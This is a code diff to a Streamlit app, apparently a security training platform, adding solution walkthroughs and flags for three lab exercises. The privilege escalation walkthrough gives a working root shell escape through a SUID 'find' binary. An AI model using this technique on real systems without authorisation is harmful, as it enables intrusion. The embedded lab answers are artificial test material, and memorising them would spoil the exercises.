@@ -103,10 +103,143 @@ with tab1:
                 col_b1, col_b2 = st.columns(2)
                 with col_b1:
                     if st.button("🔄 Retry", key=f"retry_{lab['name']}"):
-                        st.info("Resetting lab...")
+                        st.session_state.active_lab = lab['name']
+                        st.rerun()
                 with col_b2:
                     if st.button("📊 View Solution", key=f"solution_{lab['name']}"):
-                        st.success("Loading solution...")
+                        st.session_state.view_solution = lab['name']
+                        st.rerun()
+                
+                # Show solution if requested
+                if st.session_state.get('view_solution') == lab['name']:
+                    st.markdown("---")
+                    st.markdown("### 📊 Solution Walkthrough")
+                    
+                    if "Command Line" in lab['name']:
+                        st.markdown("""
+                        **Step-by-step Solution:**
+                        
+                        1. **Navigate to directory:**
+                        ```bash
+                        cd /home/student
+                        ```
+                        
+                        2. **List files:**
+                        ```bash
+                        ls -la
+                        ```
+                        
+                        3. **Read the flag file:**
+                        ```bash
+                        cat flag.txt
+                        ```
+                        
+                        4. **Flag:**
+                        ```
+                        flag{linux_basics_complete}
+                        ```
+                        
+                        **Key Commands Used:**
+                        - `cd` - Change directory
+                        - `ls -la` - List all files including hidden
+                        - `cat` - Display file contents
+                        
+                        **What You Learned:**
+                        - Basic Linux navigation
+                        - File listing and permissions
+                        - Reading file contents
+                        """)
+                    
+                    elif "Privilege Escalation" in lab['name']:
+                        st.markdown("""
+                        **Step-by-step Solution:**
+                        
+                        1. **Find SUID binaries:**
+                        ```bash
+                        find / -perm -4000 2>/dev/null
+                        ```
+                        
+                        2. **Check for vulnerable binary:**
+                        ```bash
+                        ls -la /usr/bin/find
+                        # Output: -rwsr-xr-x 1 root root
+                        ```
+                        
+                        3. **Exploit find command:**
+                        ```bash
+                        /usr/bin/find . -exec /bin/sh -p \\;
+                        ```
+                        
+                        4. **Verify root access:**
+                        ```bash
+                        whoami
+                        # Output: root
+                        ```
+                        
+                        5. **Get the flag:**
+                        ```bash
+                        cat /root/flag.txt
+                        # flag{privilege_escalation_master}
+                        ```
+                        
+                        **Key Concepts:**
+                        - SUID bit allows running as file owner
+                        - `find` command has SUID and can execute commands
+                        - `-exec` parameter runs commands with elevated privileges
+                        
+                        **Real-world Application:**
+                        - This is how attackers escalate privileges
+                        - Always check for misconfigured SUID binaries
+                        - Regular security audits are essential
+                        """)
+                    
+                    elif "Process" in lab['name']:
+                        st.markdown("""
+                        **Step-by-step Solution:**
+                        
+                        1. **List all processes:**
+                        ```bash
+                        ps aux
+                        ```
+                        
+                        2. **Find suspicious process:**
+                        ```bash
+                        ps aux | grep malware
+                        # Output: root 1337 malware_backdoor
+                        ```
+                        
+                        3. **Check process details:**
+                        ```bash
+                        ls -la /proc/1337/exe
+                        ```
+                        
+                        4. **Kill the process:**
+                        ```bash
+                        sudo kill -9 1337
+                        ```
+                        
+                        5. **Verify it's stopped:**
+                        ```bash
+                        ps aux | grep 1337
+                        # No output = process killed
+                        ```
+                        
+                        6. **Get the flag:**
+                        ```bash
+                        cat /var/log/security.log
+                        # flag{process_hunter}
+                        ```
+                        
+                        **Key Commands:**
+                        - `ps aux` - Show all processes
+                        - `grep` - Search for patterns
+                        - `kill -9` - Force kill process
+                        - `/proc/` - Process information directory
+                        """)
+                    
+                    if st.button("❌ Close Solution"):
+                        del st.session_state.view_solution
+                        st.rerun()
             else:
                 if st.button("🚀 Start Lab", key=f"start_{lab['name']}", use_container_width=True):
                     st.session_state.active_lab = lab['name']
